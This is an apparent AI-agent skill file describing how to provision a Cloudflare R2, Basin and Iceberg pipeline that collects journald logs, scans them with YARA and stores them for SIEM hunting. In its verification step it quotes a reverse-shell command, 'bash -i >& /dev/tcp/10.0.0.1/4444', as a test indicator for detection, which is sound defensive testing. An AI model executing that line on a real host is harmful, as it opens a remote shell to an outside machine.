---
name: setup-cloudflare-basin-iceberg
description: >-
  Use this skill when provisioning Cloudflare R2, Basin Catalog, Basin Stream,
  Iceberg Sink, Basin Pipeline, and deploying the ingest Worker and Vector collector
  to store systemd-journald telemetry into Apache Iceberg.
---

# Setup Cloudflare Basin Iceberg Pipeline

Follow these steps to provision Cloudflare Basin resources and deploy the `journald` -> YARA -> Iceberg pipeline.

## Prerequisites

- Node.js + `npx wrangler` authenticated (`npx wrangler login` or `CLOUDFLARE_API_TOKEN` + `CLOUDFLARE_ACCOUNT_ID`).
- A Basin Catalog API token stored in `BASIN_CATALOG_TOKEN` (R2 Data Catalog / Basin Catalog write token).
- Compiled WASM YARA binary at `adapters/ingest/cloudflare-worker-basin/src/wasm/oof_yara_wasm.wasm` (built via [build-yara-wasm.sh](../manage-yara-detection/scripts/build-yara-wasm.sh)).

## Steps

1. **Validate locally before provisioning**
   ```bash
   ./adapters/storage/cloudflare-basin-iceberg/provision-basin.sh --dry-run \
     --bucket oof-telemetry --namespace siem --table journal_logs
   ```
   Verify the generated Wrangler commands and rendered `pipeline.sql`.

2. **Provision R2, Basin Catalog, Stream, Sink, and Pipeline**
   ```bash
   export BASIN_CATALOG_TOKEN="<your-catalog-token>"
   ./adapters/storage/cloudflare-basin-iceberg/provision-basin.sh \
     --bucket oof-telemetry \
     --namespace siem \
     --table journal_logs \
     --stream journal_stream \
     --sink journal_iceberg_sink \
     --pipeline journal_to_iceberg
   ```
   (Use [pipeline-fanout.sql](../../adapters/storage/cloudflare-basin-iceberg/pipeline-fanout.sql) if you want an additional `yara_detections` Iceberg table.)

3. **Configure Worker binding and secret, then deploy**
   - Confirm `pipelines[0].stream` in [wrangler.jsonc](../../adapters/ingest/cloudflare-worker-basin/wrangler.jsonc) matches `--stream` (`journal_stream`).
   - Run tests and typecheck:
     ```bash
     npm --prefix adapters/ingest/cloudflare-worker-basin run typecheck
     npm --prefix adapters/ingest/cloudflare-worker-basin test
     ```
   - Upload the ingest Bearer token and deploy:
     ```bash
     npx --prefix adapters/ingest/cloudflare-worker-basin wrangler secret put INGEST_AUTH_TOKEN
     npx --prefix adapters/ingest/cloudflare-worker-basin wrangler deploy
     ```

4. **Point host collector (`Vector`) at the Worker**
   - Set `OOF_INGEST_URL="https://<worker-url>/v1/logs"` and `OOF_INGEST_TOKEN="<same-bearer-token>"`.
   - Start Vector with [vector.yaml](../../adapters/collect/vector-journald/vector.yaml):
     ```bash
     vector --config adapters/collect/vector-journald/vector.yaml
     ```

5. **Verify Iceberg ingestion**
   - Send a synthetic test log via `curl` (including a benign event and a test indicator like `bash -i >& /dev/tcp/10.0.0.1/4444`) and confirm HTTP `202` `{ "accepted": ..., "matched": ... }`.
   - Wait past `--roll-interval` (default 60s), then query `siem.journal_logs` with Basin SQL or DuckDB using [siem_hunting.sql](../../adapters/storage/cloudflare-basin-iceberg/queries/siem_hunting.sql).
   - Consult [basin-troubleshooting.md](./references/basin-troubleshooting.md) if rows do not appear in Iceberg.
